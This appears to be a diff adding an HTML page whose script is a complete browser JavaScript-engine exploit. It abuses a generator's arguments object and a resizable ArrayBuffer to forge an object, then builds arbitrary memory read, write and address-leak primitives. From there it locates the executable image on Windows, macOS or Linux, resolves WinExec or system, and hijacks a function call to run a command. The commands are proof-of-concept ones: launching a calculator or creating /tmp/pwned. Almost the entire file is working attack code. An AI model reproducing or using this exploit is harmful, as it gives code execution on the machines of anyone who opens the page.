@@ -1,0 +1,236 @@
+<!doctype html><html><body><div id="out">running</div><script>
+"use strict";"use strict";
+var K;
+var rab=new ArrayBuffer(1,{maxByteLength:120});
+var view=new Uint8Array(rab);
+var pins=[];
+for(var pi=0;pi<4;pi++)pins.push(new ArrayBuffer(120));
+function w16(o,x){view[o]=x&255;view[o+1]=(x>>>8)&255}
+function w32(o,x){for(var i=0;i<4;i++)view[o+i]=Number((BigInt(x)>>BigInt(i*8))&255n)}
+function w64(o,x){for(var i=0;i<8;i++)view[o+i]=Number((x>>BigInt(i*8))&255n)}
+function r64v(o){var x=0n;for(var i=0;i<8;i++)x|=BigInt(view[o+i])<<BigInt(i*8);return x}
+function mk(){function* g(a=(pins.push(new ArrayBuffer(120)),K=()=>arguments)){arguments[0]=yield 1;yield 2}var it=g();it.next();it.next(it)}
+mk();
+var junk=new ArrayBuffer(2000000);
+rab.resize(120);
+view.fill(0);
+junk=null;
+w16(18,1);
+var fake=K();
+var keep1=fake;
+var keep2=fake;
+var holder={a:fake,b:fake,c:fake,d:fake};
+var weak=new WeakRef(fake);
+var record=r64v(40);
+w16(18,24);
+w32(64,4096);
+function read8(address){w64(56,address);return fake[0]}
+function read64(address){var x=0n;for(var i=0;i<8;i++)x|=BigInt(read8(address+BigInt(i)))<<BigInt(i*8);return x}
+var weakData=read64(record+16n);
+var fakeAddress=read64(weakData);
+function restoreTyped(){view[16]=16;w16(18,24);w64(48,fakeAddress+72n);w64(88,fakeAddress+104n);w64(96,fakeAddress+40n);w32(64,4096);view[113]=0}
+function leakValue(value){view.fill(0,72,88);view[16]=16;w16(18,2);w64(56,fakeAddress+72n);w32(64,1);fake[0]=value;var address=r64v(72);fake[0]=0;restoreTyped();return address}
+var nativeObject=leakValue(String.fromCharCode);
+function write8(address,value){w64(56,address);fake[0]=value}
+function write64(address,value){for(var i=0;i<8;i++)write8(address+BigInt(i),Number((value>>BigInt(i*8))&255n))}
+function read32(address){return (read8(address)|(read8(address+1n)<<8)|(read8(address+2n)<<16)|(read8(address+3n)<<24))>>>0}
+function read16(address){return read8(address)|(read8(address+1n)<<8)}
+function readAscii(address,limit){var result="";for(var i=0;i<limit;i++){var c=read8(address+BigInt(i));if(!c)break;result+=String.fromCharCode(c)}return result}
+write8(fakeAddress-4n,255);
+write8(fakeAddress-3n,255);
+write8(fakeAddress-2n,255);
+write8(fakeAddress-1n,63);
+function pinObject(value){var address=leakValue(value);write8(address-4n,255);write8(address-3n,255);write8(address-2n,255);write8(address-1n,63)}
+pinObject(K);
+pinObject(weak);
+pinObject(rab);
+pinObject(view);
+var nativeFunction=read64(nativeObject+56n);
+var imageBase=nativeFunction&~4095n;
+var platform=0;
+for(var page=0;page<131072;page++,imageBase-=4096n){
+  var magic=read32(imageBase);
+  if(magic===1179403647){platform=3;break}
+  if(magic===4277009103){platform=2;break}
+  if((magic&65535)===23117){platform=1;break}
+  if(page===131071)throw new Error("base");
+}
+function findImport(base,name){var pe=BigInt(read32(base+60n)>>>0);var optional=base+pe+24n;var directory=optional+(read16(optional)===523?112n:96n);var imports=read32(directory+8n)>>>0;for(var d=0;d<128&&imports;d++){var descriptor=base+BigInt(imports+d*20);var original=read32(descriptor)>>>0;var dllName=read32(descriptor+12n)>>>0;var first=read32(descriptor+16n)>>>0;if(!original&&!dllName&&!first)break;var names=original||first;for(var i=0;i<2048;i++){var entry=read64(base+BigInt(names)+BigInt(i*8));if(!entry)break;if(entry>>63n)continue;var importedName=readAscii(base+(entry&4294967295n)+2n,128);if(importedName===name)return read64(base+BigInt(first)+BigInt(i*8))}}return 0n}
+function write64(address,value){for(var i=0;i<8;i++)write8(address+BigInt(i),Number((value>>BigInt(i*8))&255n))}
+function readName(strtab,off){var chars=[];var a=strtab+BigInt(off);for(var i=0;i<64;i++){var c=read8(a+BigInt(i));if(!c)break;chars.push(c)}return String.fromCharCode.apply(null,chars)}
+function findSystem(){
+  var slots=[0xF9F9D08n,0xF9FA2F8n,0xF9FA748n,0xF9F9DD8n,0xF9FA688n];
+  for(var si=0;si<slots.length;si++){
+    var fn=read64(imageBase+slots[si]);
+    if(fn<0x100000000n||fn>=imageBase&&fn<imageBase+0xF014000n)continue;
+    var p=fn&~4095n;
+    var h=null;
+    for(var i=0;i<512;i++,p-=4096n){
+      if((read32(p)>>>0)===0xFEEDFACF){h=p;break}
+    }
+    if(!h)continue;
+    var ncmds=read32(h+16n)>>>0;
+    var textVM=0n,linkVM=0n,linkFO=0n,symoff=0,nsyms=0,stroff=0;
+    var lc=h+32n;
+    for(var c=0;c<ncmds;c++){
+      var cmd=read32(lc)>>>0,size=read32(lc+4n)>>>0;
+      if(cmd===0x19){
+        var seg=readAscii(lc+8n,16);
+        if(seg==="__TEXT")textVM=read64(lc+24n);
+        if(seg==="__LINKEDIT"){linkVM=read64(lc+24n);linkFO=read64(lc+40n)}
+      }else if(cmd===0x2){
+        symoff=read32(lc+8n)>>>0;nsyms=read32(lc+12n)>>>0;stroff=read32(lc+16n)>>>0;
+      }
+      lc+=BigInt(size);
+    }
+    if(!textVM||!linkVM||!nsyms)continue;
+    var slide=h-textVM;
+    var linkeditRuntime=linkVM+slide;
+    var symtab=linkeditRuntime+(BigInt(symoff)-linkFO);
+    var strtab=linkeditRuntime+(BigInt(stroff)-linkFO);
+    for(var k=0;k<nsyms;k++){
+      var e=symtab+BigInt(k*16);
+      var soff=read32(e)>>>0;
+      var type=read8(e+4n);
+      var value=read64(e+8n);
+      if(!(type&1)||!value)continue;
+      if(readName(strtab,soff)==="_system")return value+slide;
+    }
+  }
+  return 0n;
+}
+function dynGet(dyn,tag){for(var i=0;i<64;i++){var t=read64(dyn+BigInt(i*16));var v=read64(dyn+BigInt(i*16)+8n);if(t===0n)break;if(t===tag)return v}return 0n}
+function elfFind(base,libName,symName){
+  var phoff=read64(base+32n);
+  var phentsize=read16(base+54n);
+  var phnum=read16(base+56n);
+  var dynvaddr=0n,dynsz=0n;
+  for(var i=0;i<phnum;i++){
+    var ph=base+phoff+BigInt(i*phentsize);
+    var ptype=read32(ph);
+    if(ptype===2){dynvaddr=read64(ph+16n);dynsz=read64(ph+32n)}
+  }
+  if(!dynvaddr)throw new Error("no PT_DYNAMIC");
+  var dyn=base+dynvaddr;
+  var syment=24n;
+  var gnuHash=0n;
+  var linkMapAddr=0n;
+  for(var d=0;d<256;d++){if(dynsz && BigInt((d+1)*16)>dynsz)break;
+    var tag=read64(dyn+BigInt(d*16));
+    var val=read64(dyn+BigInt(d*16)+8n);
+    if(tag===4n)syment=val;
+    if(tag===0x6ffffef5n)gnuHash=val;
+    if(tag===21n)linkMapAddr=val;
+  }
+  var linkMap=linkMapAddr?read64(linkMapAddr+8n):0n;
+  if(!linkMap)throw new Error("no r_debug");
+  var l_base=0n,ldyn=0n;
+  for(var l=0;l<128;l++){
+    var lname=read64(linkMap+8n);
+    var laddr=read64(linkMap);
+    var ldynv=read64(linkMap+16n);
+    var lnext=read64(linkMap+24n);
+    var nm=lname?readAscii(lname,256):"";
+    if(nm.indexOf(libName)!==-1){l_base=laddr;ldyn=ldynv;break}
+    if(!lnext)break;
+    linkMap=lnext;
+  }
+  if(!ldyn)throw new Error("lib not found");
+  var gnuHash=dynGet(ldyn,0x6ffffef5n);
+  var syment2=dynGet(ldyn,11n)||24n;
+  var symtab=dynGet(ldyn,6n);
+  var strtab=dynGet(ldyn,5n);
+  if(!gnuHash||!symtab||!strtab)throw new Error("no dyn entries");
+  var nbucket=read32(gnuHash);
+  var symoffset=read32(gnuHash+4n);
+  var bloomSize=read32(gnuHash+8n);
+  var bloomShift=read32(gnuHash+12n);
+  var bucketsAddr=gnuHash+BigInt(16+bloomSize*8);
+  var chainAddr=bucketsAddr+BigInt(nbucket*4);
+  var h=5381;
+  for(var ci=0;ci<symName.length;ci++){h=(((h<<5)+h+symName.charCodeAt(ci))>>>0)}
+  var bucket=h%nbucket;
+  var idx=read32(bucketsAddr+BigInt(bucket)*4n);
+  if(idx<symoffset)return 0n;
+  while(true){
+    var chainVal=read32(chainAddr+BigInt((idx-symoffset)*4));
+    if(((chainVal>>>1)===((h>>>1)&0x7fffffff))){
+      var e=symtab+BigInt(idx*Number(syment2));
+      var soff=read32(e);
+      var value=read64(e+8n);
+      if(value&&readAscii(strtab+BigInt(soff),16)===symName)return l_base+value;
+    }
+    if(chainVal&1)break;
+    idx++;
+  }
+  return 0n;
+}
+
+var command;
+if(platform===1){
+  var target=findImport(imageBase,"WinExec");
+  if(!target)throw new Error("import");
+  command="calc.exe\0";
+  var commandAddress=leakValue(command)+24n;
+var donor=[0,0,0,0];
+var donorAddress=leakValue(donor);
+var closureRecord=read64(donorAddress+56n);
+write64(donorAddress+56n,0n);
+write64(donorAddress+64n,0n);
+write64(closureRecord,0n);
+write64(closureRecord+8n,0n);
+write64(closureRecord+16n,commandAddress);
+write64(closureRecord+24n,target);
+var launch=Object.create(null);
+var launchAddress=leakValue(launch);
+write8(launchAddress+18n,16);
+write8(launchAddress+19n,0);
+write64(launchAddress+48n,closureRecord);
+launch=null;
+
+}else if(platform===2){
+  var target=findSystem();
+  if(!target)throw new Error("system");
+  command="open -a Calculator\0";
+  var commandAddress=leakValue(command)+24n;
+var donor=[0,0,0,0];
+var donorAddress=leakValue(donor);
+var closureRecord=read64(donorAddress+56n);
+write64(donorAddress+56n,0n);
+write64(donorAddress+64n,0n);
+write64(closureRecord,0n);
+write64(closureRecord+8n,0n);
+write64(closureRecord+16n,commandAddress);
+write64(closureRecord+24n,target);
+var launch=Object.create(null);
+var launchAddress=leakValue(launch);
+write8(launchAddress+18n,16);
+write8(launchAddress+19n,0);
+write64(launchAddress+48n,closureRecord);
+launch=null;
+
+}else{
+  var target=elfFind(imageBase,"libc","system");
+  if(!target)throw new Error("system");
+  command="touch /tmp/pwned\0";
+  var commandAddress=leakValue(command)+24n;
+var donor=[0,0,0,0];
+var donorAddress=leakValue(donor);
+var closureRecord=read64(donorAddress+56n);
+write64(donorAddress+56n,0n);
+write64(donorAddress+64n,0n);
+write64(closureRecord,0n);
+write64(closureRecord+8n,0n);
+write64(closureRecord+16n,commandAddress);
+write64(closureRecord+24n,target);
+var launch=Object.create(null);
+var launchAddress=leakValue(launch);
+write8(launchAddress+18n,16);
+write8(launchAddress+19n,0);
+write64(launchAddress+48n,closureRecord);
+launch=null;
+
+}
+document.getElementById("out").textContent="done";
+
+</script></body></html>
